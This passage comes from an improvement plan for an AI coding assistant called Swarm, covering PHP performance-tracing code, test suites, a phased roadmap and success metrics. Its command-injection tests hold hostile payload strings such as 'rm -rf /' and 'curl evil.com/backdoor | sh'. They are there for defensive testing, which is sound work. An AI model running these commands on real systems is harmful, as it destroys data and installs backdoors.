### 6.2 Application Performance Monitoring

```php
class APM {
    private MetricsCollector $metrics;
    private array $spans = [];
    private string $traceId;
    
    public function startSpan(string $name, array $attributes = []): string {
        $spanId = uniqid('span_');
        
        $this->spans[$spanId] = [
            'name' => $name,
            'start' => microtime(true),
            'attributes' => $attributes,
            'trace_id' => $this->traceId,
            'parent_id' => $this->getCurrentSpanId()
        ];
        
        return $spanId;
    }
    
    public function endSpan(string $spanId, array $attributes = []): void {
        if (!isset($this->spans[$spanId])) {
            return;
        }
        
        $span = $this->spans[$spanId];
        $duration = microtime(true) - $span['start'];
        
        $this->metrics->histogram('span.duration', $duration, [
            'span_name' => $span['name']
        ]);
        
        // Export span data
        $this->exportSpan([
            'trace_id' => $span['trace_id'],
            'span_id' => $spanId,
            'parent_id' => $span['parent_id'],
            'name' => $span['name'],
            'start_time' => $span['start'],
            'duration' => $duration,
            'attributes' => array_merge($span['attributes'], $attributes)
        ]);
        
        unset($this->spans[$spanId]);
    }
    
    public function trace(string $name, callable $operation, array $attributes = []): mixed {
        $spanId = $this->startSpan($name, $attributes);
        
        try {
            $result = $operation();
            $this->endSpan($spanId, ['status' => 'success']);
            return $result;
        } catch (Exception $e) {
            $this->endSpan($spanId, [
                'status' => 'error',
                'error.type' => get_class($e),
                'error.message' => $e->getMessage()
            ]);
            throw $e;
        }
    }
}
```

---

## 7. Testing Strategy

### 7.1 Security Testing

```php
// tests/Unit/Security/CommandInjectionTest.php
describe('Command Injection Prevention', function () {
    test('terminal size detection is safe from injection', function () {
        $_ENV['COLUMNS'] = '80; rm -rf /';
        $_ENV['LINES'] = '24 && echo hacked';
        
        $ui = new FullTerminalUI();
        $size = $ui->getTerminalSize();
        
        expect($size)->toBe([80, 24]);
        expect(file_exists('/etc/passwd'))->toBeTrue(); // System intact
    });
    
    test('terminal state restoration prevents injection', function () {
        $ui = new FullTerminalUI();
        $maliciousState = 'sane; curl evil.com/backdoor | sh';
        
        // Attempt to inject via state
        $reflection = new ReflectionClass($ui);
        $property = $reflection->getProperty('originalTermState');
        $property->setAccessible(true);
        $property->setValue($ui, $maliciousState);
        
        // Should sanitize on restore
        $ui->cleanup();
        
        // Verify no execution occurred
        expect(shell_exec('ps aux | grep curl'))->not->toContain('evil.com');
    });
});
```

### 7.2 Performance Testing

```php
// tests/Integration/PerformanceTest.php
describe('Performance Benchmarks', function () {
    test('context optimization reduces tokens by 30%', function () {
        $agent = new CodingAgent();
        
        // Generate large history
        $history = array_map(fn($i) => [
            'role' => $i % 3 === 0 ? 'user' : 'assistant',
            'content' => str_repeat("Message $i ", 100),
            'timestamp' => time() - (1000 - $i)
        ], range(1, 100));
        
        $original = $agent->estimateTokens($history);
        $optimized = $agent->optimizeContext($history);
        $optimizedTokens = $agent->estimateTokens($optimized);
        
        $reduction = ($original - $optimizedTokens) / $original * 100;
        
        expect($reduction)->toBeGreaterThan(30);
        expect($optimized)->toHaveCount(lessThan(50));
    });
    
    test('parallel tool execution improves speed', function () {
        $executor = new ToolExecutor();
        $executor->setStrategy(new ParallelExecutionStrategy());
        
        $tools = array_map(fn($i) => new MockSlowTool($i), range(1, 5));
        
        $start = microtime(true);
        $results = $executor->executeAll($tools);
        $duration = microtime(true) - $start;
        
        // Should complete in ~1 second (parallel) not 5 seconds (sequential)
        expect($duration)->toBeLessThan(1.5);
        expect($results)->toHaveCount(5);
    });
});
```

### 7.3 Integration Testing

```php
// tests/Integration/AIOptimizationTest.php
describe('AI Optimization Integration', function () {
    test('model router selects appropriate models', function () {
        $router = new ModelRouter();
        
        // Simple classification
        $model = $router->selectModel('classification', 2, 500);
        expect($model)->toBe('gpt-4o-mini');
        
        // Complex code generation
        $model = $router->selectModel('implementation', 9, 5000);
        expect($model)->toBe('claude-3-opus');
        
        // Long context
        $model = $router->selectModel('analysis', 5, 150000);
        expect($model)->toBe('gemini-1.5-pro');
    });
    
    test('response cache reduces API calls', function () {
        $cache = new ResponseCache();
        $agent = new CodingAgent(cache: $cache);
        
        // First call - cache miss
        $response1 = $agent->classify('Create a new file');
        expect($cache->getHitRate())->toBe(0);
        
        // Second identical call - cache hit
        $response2 = $agent->classify('Create a new file');
        expect($cache->getHitRate())->toBeGreaterThan(0);
        expect($response2)->toEqual($response1);
    });
});
```

---

## 8. Implementation Priority

### Phase 1: Critical Security (Week 1)
1. ✅ Fix command injection vulnerabilities
2. ✅ Implement process timeout mechanisms
3. ✅ Add input sanitization
4. ✅ Security test suite

### Phase 2: Performance & Stability (Week 2)
1. ⬜ Refactor FullTerminalUI into components
2. ⬜ Implement error boundary pattern
3. ⬜ Add metrics collection
4. ⬜ Performance test suite

### Phase 3: AI Optimization (Week 3)
1. ⬜ Enhanced prompts with few-shot examples
2. ⬜ Context optimization algorithm
3. ⬜ Model router implementation
4. ⬜ Response caching layer

### Phase 4: Developer Experience (Week 4)
1. ⬜ One-command setup (Makefile)
2. ⬜ Docker development environment
3. ⬜ IDE configurations
4. ⬜ Git hooks and automation

### Phase 5: Advanced Features (Week 5+)
1. ⬜ Parallel tool execution
2. ⬜ Token budget management
3. ⬜ Advanced terminal capabilities
4. ⬜ Complete APM integration

---

## Success Metrics

### Security
- Zero command injection vulnerabilities
- All processes timeout within limits
- Input validation on all user inputs

### Performance
- 30% reduction in token usage
- 40% reduction in API costs
- Sub-second UI response times

### Developer Experience
- Setup time < 2 minutes
- Pre-commit checks < 30 seconds
- Test coverage > 80%

### Code Quality
- Cyclomatic complexity < 10 per method
- No methods > 50 lines
- Consistent error handling patterns

---

## Conclusion

This comprehensive improvement plan addresses critical security vulnerabilities while enhancing performance, developer experience, and AI capabilities. The phased approach ensures immediate security fixes while building toward a more robust and efficient system.

**Immediate Actions Required**:
1. Fix command injection vulnerabilities (CRITICAL)
2. Implement process timeouts (HIGH)
3. Begin refactoring FullTerminalUI (MEDIUM)

The improvements outlined will transform Swarm into a production-ready, secure, and highly optimized AI coding assistant.